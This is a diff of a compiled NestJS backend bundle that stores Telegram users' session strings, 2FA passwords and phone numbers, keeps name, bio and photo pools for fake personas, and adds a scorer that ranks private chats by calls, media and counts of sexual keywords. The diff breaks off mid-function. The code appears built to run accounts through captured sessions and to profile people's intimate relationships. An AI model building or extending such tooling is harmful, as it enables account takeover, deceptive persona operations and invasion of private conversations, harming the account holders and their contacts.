 ], Client.prototype, "autoAssignIps", void 0);
 __decorate([
-    (0, swagger_1.ApiProperty)({ description: 'Pool of first names for persona assignment', required: false }),
+    (0, swagger_1.ApiProperty)({ description: 'First name pool for persona assignment', required: false }),
     (0, mongoose_1.Prop)({ required: false, type: [String], default: [] }),
     __metadata("design:type", Array)
 ], Client.prototype, "firstNames", void 0);
 __decorate([
-    (0, swagger_1.ApiProperty)({ description: 'Pool of last names for buffer-client persona assignment', required: false }),
+    (0, swagger_1.ApiProperty)({ description: 'Last name pool for buffer clients', required: false }),
     (0, mongoose_1.Prop)({ required: false, type: [String], default: [] }),
     __metadata("design:type", Array)
 ], Client.prototype, "bufferLastNames", void 0);
 __decorate([
-    (0, swagger_1.ApiProperty)({ description: 'Pool of last names for promote-client persona assignment', required: false }),
+    (0, swagger_1.ApiProperty)({ description: 'Last name pool for promote clients', required: false }),
     (0, mongoose_1.Prop)({ required: false, type: [String], default: [] }),
     __metadata("design:type", Array)
 ], Client.prototype, "promoteLastNames", void 0);
 __decorate([
-    (0, swagger_1.ApiProperty)({ description: 'Pool of bios for persona assignment', required: false }),
+    (0, swagger_1.ApiProperty)({ description: 'Bio pool for persona assignment', required: false }),
     (0, mongoose_1.Prop)({ required: false, type: [String], default: [] }),
     __metadata("design:type", Array)
 ], Client.prototype, "bios", void 0);
 __decorate([
-    (0, swagger_1.ApiProperty)({ description: 'Pool of profile pic URLs', required: false }),
+    (0, swagger_1.ApiProperty)({ description: 'Profile pic URL pool', required: false }),
     (0, mongoose_1.Prop)({ required: false, type: [String], default: [] }),
     __metadata("design:type", Array)
 ], Client.prototype, "profilePics", void 0);
@@ -35208,147 +34824,155 @@ var __metadata = (this && this.__metadata) || function (k, v) {
     if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
 };
 Object.defineProperty(exports, "__esModule", ({ value: true }));
-exports.CreateUserDto = void 0;
+exports.CreateUserDto = exports.UserCallsDto = void 0;
 const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
+class UserCallsDto {
+    constructor() {
+        this.totalCalls = 0;
+        this.outgoing = 0;
+        this.incoming = 0;
+        this.video = 0;
+        this.audio = 0;
+    }
+}
+exports.UserCallsDto = UserCallsDto;
+__decorate([
+    (0, swagger_1.ApiProperty)({ description: 'Total calls' }),
+    __metadata("design:type", Number)
+], UserCallsDto.prototype, "totalCalls", void 0);
+__decorate([
+    (0, swagger_1.ApiProperty)({ description: 'Outgoing calls' }),
+    __metadata("design:type", Number)
+], UserCallsDto.prototype, "outgoing", void 0);
+__decorate([
+    (0, swagger_1.ApiProperty)({ description: 'Incoming calls' }),
+    __metadata("design:type", Number)
+], UserCallsDto.prototype, "incoming", void 0);
+__decorate([
+    (0, swagger_1.ApiProperty)({ description: 'Video calls' }),
+    __metadata("design:type", Number)
+], UserCallsDto.prototype, "video", void 0);
+__decorate([
+    (0, swagger_1.ApiProperty)({ description: 'Audio calls' }),
+    __metadata("design:type", Number)
+], UserCallsDto.prototype, "audio", void 0);
 class CreateUserDto {
     constructor() {
         this.twoFA = false;
         this.expired = false;
         this.password = null;
-        this.movieCount = 0;
+        this.channels = 0;
+        this.personalChats = 0;
+        this.totalChats = 0;
+        this.contacts = 0;
+        this.msgs = 0;
         this.photoCount = 0;
         this.videoCount = 0;
-        this.otherPhotoCount = 0;
-        this.otherVideoCount = 0;
+        this.movieCount = 0;
         this.ownPhotoCount = 0;
+        this.otherPhotoCount = 0;
         this.ownVideoCount = 0;
-        this.contacts = 0;
-        this.starred = false;
-        this.score = 0;
-        this.calls = {
-            totalCalls: 0,
-            outgoing: 0,
-            incoming: 0,
-            video: 0,
-            audio: 0,
-            chats: [],
-        };
+        this.otherVideoCount = 0;
+        this.lastActive = null;
+        this.calls = new UserCallsDto();
     }
 }
 exports.CreateUserDto = CreateUserDto;
 __decorate([
-    (0, swagger_1.ApiProperty)({ description: 'Mobile number of the user', example: '917330803480' }),
+    (0, swagger_1.ApiProperty)({ description: 'Mobile number' }),
     __metadata("design:type", String)
 ], CreateUserDto.prototype, "mobile", void 0);
 __decorate([
-    (0, swagger_1.ApiProperty)({ description: 'Session information of the user', example: 'string' }),
+    (0, swagger_1.ApiProperty)({ description: 'Telegram session string' }),
     __metadata("design:type", String)
 ], CreateUserDto.prototype, "session", void 0);
 __decorate([
-    (0, swagger_1.ApiProperty)({ description: 'First name of the user', example: 'Praveen' }),
+    (0, swagger_1.ApiProperty)({ description: 'First name' }),
     __metadata("design:type", String)
 ], CreateUserDto.prototype, "firstName", void 0);
 __decorate([
-    (0, swagger_1.ApiPropertyOptional)({ description: 'Last name of the user', example: null }),
+    (0, swagger_1.ApiPropertyOptional)({ description: 'Last name' }),
     __metadata("design:type", String)
 ], CreateUserDto.prototype, "lastName", void 0);
 __decorate([
-    (0, swagger_1.ApiPropertyOptional)({ description: 'Username of the user', example: null }),
+    (0, swagger_1.ApiPropertyOptional)({ description: 'Telegram username' }),
     __metadata("design:type", String)
 ], CreateUserDto.prototype, "username", void 0);
 __decorate([
-    (0, swagger_1.ApiProperty)({ description: 'Number of channels', example: 56 }),
-    __metadata("design:type", Number)
-], CreateUserDto.prototype, "channels", void 0);
-__decorate([
-    (0, swagger_1.ApiProperty)({ description: 'Number of personal chats', example: 74 }),
-    __metadata("design:type", Number)
-], CreateUserDto.prototype, "personalChats", void 0);
-__decorate([
-    (0, swagger_1.ApiProperty)({ description: 'Number of messages', example: 0 }),
-    __metadata("design:type", Number)
-], CreateUserDto.prototype, "msgs", void 0);
-__decorate([
-    (0, swagger_1.ApiProperty)({ description: 'Total number of chats', example: 195 }),
-    __metadata("design:type", Number)
-], CreateUserDto.prototype, "totalChats", void 0);
-__decorate([
-    (0, swagger_1.ApiProperty)({ description: 'Timestamp of last active', example: '2024-06-03' }),
-    __metadata("design:type", String)
-], CreateUserDto.prototype, "lastActive", void 0);
-__decorate([
-    (0, swagger_1.ApiProperty)({ description: 'Telegram ID of the user', example: '2022068676' }),
+    (0, swagger_1.ApiProperty)({ description: 'Telegram user ID' }),
     __metadata("design:type", String)
 ], CreateUserDto.prototype, "tgId", void 0);
 __decorate([
-    (0, swagger_1.ApiProperty)({ description: 'TwoFA status', example: false }),
-    __metadata("design:type", Boolean)
-], CreateUserDto.prototype, "twoFA", void 0);
-__decorate([
-    (0, swagger_1.ApiProperty)({ description: 'Expiration status', example: false }),
-    __metadata("design:type", Boolean)
-], CreateUserDto.prototype, "expired", void 0);
-__decorate([
-    (0, swagger_1.ApiProperty)({ description: 'password', example: "pass" }),
-    __metadata("design:type", String)
-], CreateUserDto.prototype, "password", void 0);
-__decorate([
-    (0, swagger_1.ApiProperty)({ description: 'Number of movies', example: 0 }),
-    __metadata("design:type", Number)
-], CreateUserDto.prototype, "movieCount", void 0);
-__decorate([
-    (0, swagger_1.ApiProperty)({ description: 'Number of photos', example: 0 }),
-    __metadata("design:type", Number)
-], CreateUserDto.prototype, "photoCount", void 0);
-__decorate([
-    (0, swagger_1.ApiProperty)({ description: 'Number of videos', example: 0 }),
-    __metadata("design:type", Number)
-], CreateUserDto.prototype, "videoCount", void 0);
-__decorate([
-    (0, swagger_1.ApiPropertyOptional)({ description: 'Gender of the user', example: null }),
+    (0, swagger_1.ApiPropertyOptional)({ description: 'Gender' }),
     __metadata("design:type", String)
 ], CreateUserDto.prototype, "gender", void 0);
 __decorate([
-    (0, swagger_1.ApiProperty)({ description: 'Number of other photos', example: 0 }),
-    __metadata("design:type", Number)
-], CreateUserDto.prototype, "otherPhotoCount", void 0);
+    (0, swagger_1.ApiProperty)({ description: '2FA enabled' }),
+    __metadata("design:type", Boolean)
+], CreateUserDto.prototype, "twoFA", void 0);
 __decorate([
-    (0, swagger_1.ApiProperty)({ description: 'Number of other videos', example: 0 }),
-    __metadata("design:type", Number)
-], CreateUserDto.prototype, "otherVideoCount", void 0);
+    (0, swagger_1.ApiProperty)({ description: 'Account expired' }),
+    __metadata("design:type", Boolean)
+], CreateUserDto.prototype, "expired", void 0);
 __decorate([
-    (0, swagger_1.ApiProperty)({ description: 'Number of own photos', example: 0 }),
-    __metadata("design:type", Number)
-], CreateUserDto.prototype, "ownPhotoCount", void 0);
+    (0, swagger_1.ApiProperty)({ description: '2FA password' }),
+    __metadata("design:type", String)
+], CreateUserDto.prototype, "password", void 0);
 __decorate([
-    (0, swagger_1.ApiProperty)({ description: 'Number of own videos', example: 0 }),
+    (0, swagger_1.ApiProperty)({ description: 'Channel count' }),
     __metadata("design:type", Number)
-], CreateUserDto.prototype, "ownVideoCount", void 0);
+], CreateUserDto.prototype, "channels", void 0);
 __decorate([
-    (0, swagger_1.ApiProperty)({ description: 'Number of contacts', example: 105 }),
+    (0, swagger_1.ApiProperty)({ description: 'Personal chat count' }),
+    __metadata("design:type", Number)
+], CreateUserDto.prototype, "personalChats", void 0);
+__decorate([
+    (0, swagger_1.ApiProperty)({ description: 'Total chat count' }),
+    __metadata("design:type", Number)
+], CreateUserDto.prototype, "totalChats", void 0);
+__decorate([
+    (0, swagger_1.ApiProperty)({ description: 'Contact count' }),
     __metadata("design:type", Number)
 ], CreateUserDto.prototype, "contacts", void 0);
 __decorate([
-    (0, swagger_1.ApiProperty)({ description: 'Starred status', example: false }),
-    __metadata("design:type", Boolean)
-], CreateUserDto.prototype, "starred", void 0);
-__decorate([
-    (0, swagger_1.ApiProperty)({ description: 'User score', example: 0 }),
+    (0, swagger_1.ApiProperty)({ description: 'Message count' }),
     __metadata("design:type", Number)
-], CreateUserDto.prototype, "score", void 0);
+], CreateUserDto.prototype, "msgs", void 0);
 __decorate([
-    (0, swagger_1.ApiPropertyOptional)({
-        description: 'Per-chat call statistics',
-        example: {
-            totalCalls: 0,
-            outgoing: 0,
-            incoming: 0,
-            video: 0,
-            audio: 0,
-            chats: [],
-        },
-    }),
-    __metadata("design:type", Object)
+    (0, swagger_1.ApiProperty)({ description: 'Total photo count' }),
+    __metadata("design:type", Number)
+], CreateUserDto.prototype, "photoCount", void 0);
+__decorate([
+    (0, swagger_1.ApiProperty)({ description: 'Total video count' }),
+    __metadata("design:type", Number)
+], CreateUserDto.prototype, "videoCount", void 0);
+__decorate([
+    (0, swagger_1.ApiProperty)({ description: 'Movie file count' }),
+    __metadata("design:type", Number)
+], CreateUserDto.prototype, "movieCount", void 0);
+__decorate([
+    (0, swagger_1.ApiProperty)({ description: 'Sent photo count' }),
+    __metadata("design:type", Number)
+], CreateUserDto.prototype, "ownPhotoCount", void 0);
+__decorate([
+    (0, swagger_1.ApiProperty)({ description: 'Received photo count' }),
+    __metadata("design:type", Number)
+], CreateUserDto.prototype, "otherPhotoCount", void 0);
+__decorate([
+    (0, swagger_1.ApiProperty)({ description: 'Sent video count' }),
+    __metadata("design:type", Number)
+], CreateUserDto.prototype, "ownVideoCount", void 0);
+__decorate([
+    (0, swagger_1.ApiProperty)({ description: 'Received video count' }),
+    __metadata("design:type", Number)
+], CreateUserDto.prototype, "otherVideoCount", void 0);
+__decorate([
+    (0, swagger_1.ApiPropertyOptional)({ description: 'Last active timestamp' }),
+    __metadata("design:type", String)
+], CreateUserDto.prototype, "lastActive", void 0);
+__decorate([
+    (0, swagger_1.ApiPropertyOptional)({ description: 'Call statistics' }),
+    __metadata("design:type", UserCallsDto)
 ], CreateUserDto.prototype, "calls", void 0);
 
 
@@ -35408,151 +35032,73 @@ class SearchUserDto {
 }
 exports.SearchUserDto = SearchUserDto;
 __decorate([
-    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by Telegram ID' }),
+    (0, swagger_1.ApiPropertyOptional)({ description: 'Telegram ID' }),
     (0, class_validator_1.IsOptional)(),
     (0, class_validator_1.IsString)(),
     __metadata("design:type", String)
 ], SearchUserDto.prototype, "tgId", void 0);
 __decorate([
-    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by mobile number' }),
+    (0, swagger_1.ApiPropertyOptional)({ description: 'Mobile number' }),
     (0, class_validator_1.IsOptional)(),
     (0, class_validator_1.IsString)(),
     __metadata("design:type", String)
 ], SearchUserDto.prototype, "mobile", void 0);
 __decorate([
-    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by twoFA status', type: Boolean }),
+    (0, swagger_1.ApiPropertyOptional)({ description: '2FA status' }),
     (0, class_validator_1.IsOptional)(),
     (0, class_validator_1.IsBoolean)(),
     __metadata("design:type", Boolean)
 ], SearchUserDto.prototype, "twoFA", void 0);
 __decorate([
-    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by Expiration status', type: Boolean }),
+    (0, swagger_1.ApiPropertyOptional)({ description: 'Expiration status' }),
     (0, class_validator_1.IsOptional)(),
     (0, class_validator_1.IsBoolean)(),
     __metadata("design:type", Boolean)
 ], SearchUserDto.prototype, "expired", void 0);
 __decorate([
-    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by session' }),
+    (0, swagger_1.ApiPropertyOptional)({ description: 'Session string' }),
     (0, class_validator_1.IsOptional)(),
     (0, class_validator_1.IsString)(),
     __metadata("design:type", String)
 ], SearchUserDto.prototype, "session", void 0);
 __decorate([
-    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by first name' }),
+    (0, swagger_1.ApiPropertyOptional)({ description: 'First name' }),
     (0, class_validator_1.IsOptional)(),
     (0, class_validator_1.IsString)(),
     __metadata("design:type", String)
 ], SearchUserDto.prototype, "firstName", void 0);
 __decorate([
-    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by last name' }),
+    (0, swagger_1.ApiPropertyOptional)({ description: 'Last name' }),
     (0, class_validator_1.IsOptional)(),
     (0, class_validator_1.IsString)(),
     __metadata("design:type", String)
 ], SearchUserDto.prototype, "lastName", void 0);
 __decorate([
-    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by username' }),
+    (0, swagger_1.ApiPropertyOptional)({ description: 'Telegram username' }),
     (0, class_validator_1.IsOptional)(),
     (0, class_validator_1.IsString)(),
     __metadata("design:type", String)
 ], SearchUserDto.prototype, "username", void 0);
 __decorate([
-    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by channels count' }),
+    (0, swagger_1.ApiPropertyOptional)({ description: 'Gender' }),
     (0, class_validator_1.IsOptional)(),
-    (0, class_validator_1.IsNumber)(),
-    __metadata("design:type", Number)
-], SearchUserDto.prototype, "channels", void 0);
+    (0, class_validator_1.IsString)(),
+    __metadata("design:type", String)
+], SearchUserDto.prototype, "gender", void 0);
 __decorate([
-    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by personal chats count' }),
-    (0, class_validator_1.IsOptional)(),
-    (0, class_validator_1.IsNumber)(),
-    __metadata("design:type", Number)
-], SearchUserDto.prototype, "personalChats", void 0);
-__decorate([
-    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by demo given status', type: Boolean }),
+    (0, swagger_1.ApiPropertyOptional)({ description: 'Demo given status' }),
     (0, class_transformer_1.Transform)(({ value }) => value === 'true' || value === true),
     (0, class_validator_1.IsOptional)(),
     (0, class_validator_1.IsBoolean)(),
     __metadata("design:type", Boolean)
 ], SearchUserDto.prototype, "demoGiven", void 0);
 __decorate([
-    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by messages count' }),
-    (0, class_validator_1.IsOptional)(),
-    (0, class_validator_1.IsNumber)(),
-    __metadata("design:type", Number)
-], SearchUserDto.prototype, "msgs", void 0);
-__decorate([
-    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by total chats count' }),
-    (0, class_validator_1.IsOptional)(),
-    (0, class_validator_1.IsNumber)(),
-    __metadata("design:type", Number)
-], SearchUserDto.prototype, "totalChats", void 0);
-__decorate([
-    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by last active timestamp' }),
-    (0, class_validator_1.IsOptional)(),
-    (0, class_validator_1.IsNumber)(),
-    __metadata("design:type", String)
-], SearchUserDto.prototype, "lastActive", void 0);
-__decorate([
-    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by movie count' }),
-    (0, class_validator_1.IsOptional)(),
-    (0, class_validator_1.IsNumber)(),
-    __metadata("design:type", Number)
-], SearchUserDto.prototype, "movieCount", void 0);
-__decorate([
-    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by photo count' }),
-    (0, class_validator_1.IsOptional)(),
-    (0, class_validator_1.IsNumber)(),
-    __metadata("design:type", Number)
-], SearchUserDto.prototype, "photoCount", void 0);
-__decorate([
-    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by video count' }),
-    (0, class_validator_1.IsOptional)(),
-    (0, class_validator_1.IsNumber)(),
-    __metadata("design:type", Number)
-], SearchUserDto.prototype, "videoCount", void 0);
-__decorate([
-    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by gender' }),
-    (0, class_validator_1.IsOptional)(),
-    (0, class_validator_1.IsString)(),
-    __metadata("design:type", String)
-], SearchUserDto.prototype, "gender", void 0);
-__decorate([
-    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by other photo count' }),
-    (0, class_validator_1.IsOptional)(),
-    (0, class_validator_1.IsNumber)(),
-    __metadata("design:type", Number)
-], SearchUserDto.prototype, "otherPhotoCount", void 0);
-__decorate([
-    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by other video count' }),
-    (0, class_validator_1.IsOptional)(),
-    (0, class_validator_1.IsNumber)(),
-    __metadata("design:type", Number)
-], SearchUserDto.prototype, "otherVideoCount", void 0);
-__decorate([
-    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by own photo count' }),
-    (0, class_validator_1.IsOptional)(),
-    (0, class_validator_1.IsNumber)(),
-    __metadata("design:type", Number)
-], SearchUserDto.prototype, "ownPhotoCount", void 0);
-__decorate([
-    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by own video count' }),
-    (0, class_validator_1.IsOptional)(),
-    (0, class_validator_1.IsNumber)(),
-    __metadata("design:type", Number)
-], SearchUserDto.prototype, "ownVideoCount", void 0);
-__decorate([
-    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by starred status', type: Boolean }),
+    (0, swagger_1.ApiPropertyOptional)({ description: 'Starred status' }),
     (0, class_transformer_1.Transform)(({ value }) => value === 'true' || value === true),
     (0, class_validator_1.IsOptional)(),
     (0, class_validator_1.IsBoolean)(),
     __metadata("design:type", Boolean)
 ], SearchUserDto.prototype, "starred", void 0);
-__decorate([
-    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by score' }),
-    (0, class_validator_1.IsOptional)(),
-    (0, class_validator_1.IsNumber)(),
-    __metadata("design:type", Number)
-], SearchUserDto.prototype, "score", void 0);
 
 
 /***/ },
@@ -35663,87 +35209,41 @@ let User = class User {
         this.expired = false;
         this.password = null;
         this.starred = false;
-        this.score = 0;
     }
 };
 exports.User = User;
 __decorate([
-    (0, swagger_1.ApiProperty)(),
+    (0, swagger_1.ApiProperty)({ description: 'Mobile number' }),
     (0, mongoose_1.Prop)({ required: true, unique: true }),
     __metadata("design:type", String)
 ], User.prototype, "mobile", void 0);
 __decorate([
-    (0, swagger_1.ApiProperty)(),
+    (0, swagger_1.ApiProperty)({ description: 'Telegram session string' }),
     (0, mongoose_1.Prop)({ required: true, unique: true }),
     __metadata("design:type", String)
 ], User.prototype, "session", void 0);
 __decorate([
-    (0, swagger_1.ApiProperty)(),
-    (0, mongoose_1.Prop)(),
-    __metadata("design:type", String)
-], User.prototype, "firstName", void 0);
-__decorate([
-    (0, swagger_1.ApiProperty)({ required: false }),
-    (0, mongoose_1.Prop)(),
-    __metadata("design:type", String)
-], User.prototype, "lastName", void 0);
-__decorate([
-    (0, swagger_1.ApiProperty)({ required: false }),
-    (0, mongoose_1.Prop)(),
-    __metadata("design:type", String)
-], User.prototype, "username", void 0);
-__decorate([
-    (0, swagger_1.ApiProperty)(),
-    (0, mongoose_1.Prop)(),
-    __metadata("design:type", Number)
-], User.prototype, "channels", void 0);
-__decorate([
-    (0, swagger_1.ApiProperty)(),
-    (0, mongoose_1.Prop)(),
-    __metadata("design:type", Number)
-], User.prototype, "personalChats", void 0);
-__decorate([
-    (0, swagger_1.ApiProperty)(),
-    (0, mongoose_1.Prop)(),
-    __metadata("design:type", Boolean)
-], User.prototype, "demoGiven", void 0);
-__decorate([
-    (0, swagger_1.ApiProperty)(),
-    (0, mongoose_1.Prop)(),
-    __metadata("design:type", Number)
-], User.prototype, "msgs", void 0);
-__decorate([
-    (0, swagger_1.ApiProperty)(),
-    (0, mongoose_1.Prop)(),
-    __metadata("design:type", Number)
-], User.prototype, "totalChats", void 0);
-__decorate([
-    (0, swagger_1.ApiProperty)(),
-    (0, mongoose_1.Prop)(),
-    __metadata("design:type", String)
-], User.prototype, "lastActive", void 0);
-__decorate([
-    (0, swagger_1.ApiProperty)(),
+    (0, swagger_1.ApiProperty)({ description: 'Telegram user ID' }),
     (0, mongoose_1.Prop)({ required: true, unique: true }),
     __metadata("design:type", String)
 ], User.prototype, "tgId", void 0);
 __decorate([
-    (0, swagger_1.ApiProperty)(),
+    (0, swagger_1.ApiProperty)({ description: 'First name' }),
     (0, mongoose_1.Prop)(),
-    __metadata("design:type", Number)
-], User.prototype, "movieCount", void 0);
+    __metadata("design:type", String)
+], User.prototype, "firstName", void 0);
 __decorate([
-    (0, swagger_1.ApiProperty)(),
+    (0, swagger_1.ApiProperty)({ description: 'Last name', required: false }),
     (0, mongoose_1.Prop)(),
-    __metadata("design:type", Number)
-], User.prototype, "photoCount", void 0);
+    __metadata("design:type", String)
+], User.prototype, "lastName", void 0);
 __decorate([
-    (0, swagger_1.ApiProperty)(),
+    (0, swagger_1.ApiProperty)({ description: 'Telegram username', required: false }),
     (0, mongoose_1.Prop)(),
-    __metadata("design:type", Number)
-], User.prototype, "videoCount", void 0);
+    __metadata("design:type", String)
+], User.prototype, "username", void 0);
 __decorate([
-    (0, swagger_1.ApiProperty)({ required: false }),
+    (0, swagger_1.ApiProperty)({ description: 'Gender', required: false }),
     (0, mongoose_1.Prop)(),
     __metadata("design:type", String)
 ], User.prototype, "gender", void 0);
@@ -35760,62 +35260,102 @@ __decorate([
     __metadata("design:type", String)
 ], User.prototype, "password", void 0);
 __decorate([
-    (0, swagger_1.ApiProperty)(),
-    (0, mongoose_1.Prop)(),
-    __metadata("design:type", Number)
-], User.prototype, "otherPhotoCount", void 0);
-__decorate([
-    (0, swagger_1.ApiProperty)(),
-    (0, mongoose_1.Prop)(),
-    __metadata("design:type", Number)
-], User.prototype, "otherVideoCount", void 0);
-__decorate([
-    (0, swagger_1.ApiProperty)(),
-    (0, mongoose_1.Prop)(),
-    __metadata("design:type", Number)
-], User.prototype, "ownPhotoCount", void 0);
-__decorate([
-    (0, swagger_1.ApiProperty)(),
-    (0, mongoose_1.Prop)(),
-    __metadata("design:type", Number)
-], User.prototype, "ownVideoCount", void 0);
-__decorate([
-    (0, swagger_1.ApiProperty)(),
-    (0, mongoose_1.Prop)(),
-    __metadata("design:type", Number)
-], User.prototype, "contacts", void 0);
-__decorate([
-    (0, swagger_1.ApiProperty)(),
+    (0, swagger_1.ApiProperty)({ description: 'Starred for manual review' }),
     (0, mongoose_1.Prop)({ required: false, type: Boolean, default: false }),
     __metadata("design:type", Boolean)
 ], User.prototype, "starred", void 0);
 __decorate([
-    (0, swagger_1.ApiProperty)(),
-    (0, mongoose_1.Prop)({ required: false, type: Number, default: 0 }),
-    __metadata("design:type", Number)
-], User.prototype, "score", void 0);
+    (0, swagger_1.ApiProperty)({ description: 'Whether demo was given' }),
+    (0, mongoose_1.Prop)(),
+    __metadata("design:type", Boolean)
+], User.prototype, "demoGiven", void 0);
 __decorate([
-    (0, swagger_1.ApiProperty)(),
+    (0, swagger_1.ApiProperty)({ description: 'Channel count' }),
+    (0, mongoose_1.Prop)(),
+    __metadata("design:type", Number)
+], User.prototype, "channels", void 0);
+__decorate([
+    (0, swagger_1.ApiProperty)({ description: 'Personal chat count' }),
+    (0, mongoose_1.Prop)(),
+    __metadata("design:type", Number)
+], User.prototype, "personalChats", void 0);
+__decorate([
+    (0, swagger_1.ApiProperty)({ description: 'Total chat count' }),
+    (0, mongoose_1.Prop)(),
+    __metadata("design:type", Number)
+], User.prototype, "totalChats", void 0);
+__decorate([
+    (0, swagger_1.ApiProperty)({ description: 'Contact count' }),
+    (0, mongoose_1.Prop)(),
+    __metadata("design:type", Number)
+], User.prototype, "contacts", void 0);
+__decorate([
+    (0, swagger_1.ApiProperty)({ description: 'Message count' }),
+    (0, mongoose_1.Prop)(),
+    __metadata("design:type", Number)
+], User.prototype, "msgs", void 0);
+__decorate([
+    (0, swagger_1.ApiProperty)({ description: 'Total photo count' }),
+    (0, mongoose_1.Prop)(),
+    __metadata("design:type", Number)
+], User.prototype, "photoCount", void 0);
+__decorate([
+    (0, swagger_1.ApiProperty)({ description: 'Total video count' }),
+    (0, mongoose_1.Prop)(),
+    __metadata("design:type", Number)
+], User.prototype, "videoCount", void 0);
+__decorate([
+    (0, swagger_1.ApiProperty)({ description: 'Movie file count' }),
+    (0, mongoose_1.Prop)(),
+    __metadata("design:type", Number)
+], User.prototype, "movieCount", void 0);
+__decorate([
+    (0, swagger_1.ApiProperty)({ description: 'Sent photo count' }),
+    (0, mongoose_1.Prop)(),
+    __metadata("design:type", Number)
+], User.prototype, "ownPhotoCount", void 0);
+__decorate([
+    (0, swagger_1.ApiProperty)({ description: 'Received photo count' }),
+    (0, mongoose_1.Prop)(),
+    __metadata("design:type", Number)
+], User.prototype, "otherPhotoCount", void 0);
+__decorate([
+    (0, swagger_1.ApiProperty)({ description: 'Sent video count' }),
+    (0, mongoose_1.Prop)(),
+    __metadata("design:type", Number)
+], User.prototype, "ownVideoCount", void 0);
+__decorate([
+    (0, swagger_1.ApiProperty)({ description: 'Received video count' }),
+    (0, mongoose_1.Prop)(),
+    __metadata("design:type", Number)
+], User.prototype, "otherVideoCount", void 0);
+__decorate([
+    (0, swagger_1.ApiProperty)({ description: 'Last active timestamp' }),
+    (0, mongoose_1.Prop)(),
+    __metadata("design:type", String)
+], User.prototype, "lastActive", void 0);
+__decorate([
+    (0, swagger_1.ApiProperty)({ description: 'Call statistics', required: false }),
     (0, mongoose_1.Prop)({
         type: mongoose_2.default.Schema.Types.Mixed,
-        default: {
-            totalCalls: 0,
-            outgoing: 0,
-            incoming: 0,
-            video: 0,
-            audio: 0,
-            chats: [],
-        },
+        default: { totalCalls: 0, outgoing: 0, incoming: 0, video: 0, audio: 0 },
     }),
     __metadata("design:type", Object)
 ], User.prototype, "calls", void 0);
+__decorate([
+    (0, swagger_1.ApiProperty)({ description: 'Relationship analysis', required: false }),
+    (0, mongoose_1.Prop)({
+        type: mongoose_2.default.Schema.Types.Mixed,
+        default: { score: 0, bestScore: 0, computedAt: null, top: [] },
+    }),
+    __metadata("design:type", Object)
+], User.prototype, "relationships", void 0);
 exports.User = User = __decorate([
     (0, mongoose_1.Schema)({
         collection: 'users', versionKey: false, autoIndex: true, timestamps: true,
         toJSON: {
             virtuals: true,
             transform: (doc, ret) => {
-                ret['id'] = ret._id;
                 delete ret._id;
                 return ret;
             },
@@ -35823,6 +35363,93 @@ exports.User = User = __decorate([
     })
 ], User);
 exports.UserSchema = mongoose_1.SchemaFactory.createForClass(User);
+exports.UserSchema.index({ 'relationships.bestScore': -1 });
+exports.UserSchema.index({ lastActive: -1 });
+
+
+/***/ },
+
+/***/ "./src/components/users/scoring/index.ts"
+/*!***********************************************!*\
+  !*** ./src/components/users/scoring/index.ts ***!
+  \***********************************************/
+(__unused_webpack_module, exports, __webpack_require__) {
+
+
+var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
+    if (k2 === undefined) k2 = k;
+    var desc = Object.getOwnPropertyDescriptor(m, k);
+    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
+      desc = { enumerable: true, get: function() { return m[k]; } };
+    }
+    Object.defineProperty(o, k2, desc);
+}) : (function(o, m, k, k2) {
+    if (k2 === undefined) k2 = k;
+    o[k2] = m[k];
+}));
+var __exportStar = (this && this.__exportStar) || function(m, exports) {
+    for (var p in m) if (p !== "default" && !Object.prototype.hasOwnProperty.call(exports, p)) __createBinding(exports, m, p);
+};
+Object.defineProperty(exports, "__esModule", ({ value: true }));
+__exportStar(__webpack_require__(/*! ./relationship-scorer */ "./src/components/users/scoring/relationship-scorer.ts"), exports);
+
+
+/***/ },
+
+/***/ "./src/components/users/scoring/relationship-scorer.ts"
+/*!*************************************************************!*\
+  !*** ./src/components/users/scoring/relationship-scorer.ts ***!
+  \*************************************************************/
+(__unused_webpack_module, exports) {
+
+
+Object.defineProperty(exports, "__esModule", ({ value: true }));
+exports.INTIMATE_KEYWORDS = void 0;
+exports.scoreRelationship = scoreRelationship;
+exports.rankRelationships = rankRelationships;
+exports.computeAccountScore = computeAccountScore;
+exports.INTIMATE_KEYWORDS = [
+    'love', 'luv',
+    'kiss',
+    'sex',
+    'baby', 'babe',
+    'fuck',
+    'boobs',
+    'dick',
+    'pussy',
+    'hug'
+];
+function scoreRelationship(chat) {
+    const { messages, mediaCount, voiceCount, intimateMessageCount, calls, commonChats, isMutualContact, lastMessageDate } = chat;
+    const msgScore = Math.min(messages, 3000) * 1.0;
+    const mediaScore = Math.min(mediaCount, 300) * 3.0;
+    const voiceScore = Math.min(voiceCount, 100) * 4.0;
+    const callScore = calls.incoming * 8.0 +
+        (calls.total - calls.incoming) * 3.0 +
+        calls.videoCalls * 12.0 +
+        Math.min(calls.totalDuration, 36000) * 0.02 +
+        Math.min(calls.avgDuration, 1800) * 0.1;
+    const intimateScore = Math.min(intimateMessageCount, 500) * 10.0;
+    const mutualScore = isMutualContact ? 50 : 0;
+    const commonChatScore = Math.min(commonChats, 10) * 15.0;
